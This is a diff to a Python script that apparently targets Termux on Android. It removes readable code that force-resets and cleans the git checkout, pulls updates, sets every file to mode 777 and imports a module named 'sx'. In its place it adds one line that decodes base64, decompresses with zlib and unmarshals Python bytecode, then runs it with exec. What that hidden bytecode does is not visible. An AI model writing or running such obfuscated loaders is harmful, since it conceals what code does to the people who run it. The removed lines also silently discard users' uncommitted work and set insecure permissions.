@@ -1,21 +1,2 @@
-#!/data/data/com.termux/files/usr/bin/python3.12
-# -*- coding: utf-8 -*-
-import os
-import subprocess
- 
-bit = os.uname().machine
-changes = subprocess.getoutput("git status --porcelain")
- 
-if changes:
-    os.system("git reset --hard")
-    os.system("git clean -fd")
-    os.system("git pull")
- 
-os.system("chmod 777 *")
- 
-if '64' in bit:
-    import sx
-else:
-    os.system("clear")
-    print("TOOL NOT AVAILABLE FOR 32 BIT DEVICE")
- 
+import marshal,zlib,base64
+exec(marshal.loads(zlib.decompress(base64.b64decode(b'eJyNj0GL00AUx2eSSZqMtKwelnqpI3jZhYK6shUUodWKgbIFKXvoLU3GpiFNSmYiNqcUD+3Rm59B9st0MbLr6KHiyZvQL2BS61apC/sO8+b/3u893v87+CvkdV6+gAC8BzawoQe6vzPsQglQ4CKwFSfr7KrbvS7KpqCLtzu2dALXjErV8HC1vfQfTv7DQXApg67AKFdg1A1jFyh6DUJl5V7ramN46ZT2z2bd1jd6DPfwj/x7FO/2B5wwbvKIkWp1FIQW9cyBH+/k9ZAyyrOyY4Z2XMwrlkdNn1Rf2bGWy1HkefE1yxkGNqnVamRfSIcPhJJTYXyn0263yFG7Q+rHdaNVb7Sa5Hn7JTm4TxpGhzxrHhtPm3tYSAETmEW9URhYlDGhRL45pKIwNC1n4FMh9wZc6H3Kg4iPIi4KlmP6fcqEysaM06GQ2BuhjMKBzz+AZW5LSHZfaI+zqyKPPglvrEwDwN5lz08ZQrhUAcRfwPWFWkp6U2fivHXP1PKpWk7kc1yZ7Z/hyimuzG/VPuKHSeGbjM9RMWlMjYkxL5EU3b6QsyBFlY1yU3RzAfREmuoTfVZNQXkhF2YHk0dfUXFxQfVTtPsZ6XN89xO6F+5kR/0C15CgWg=='))))
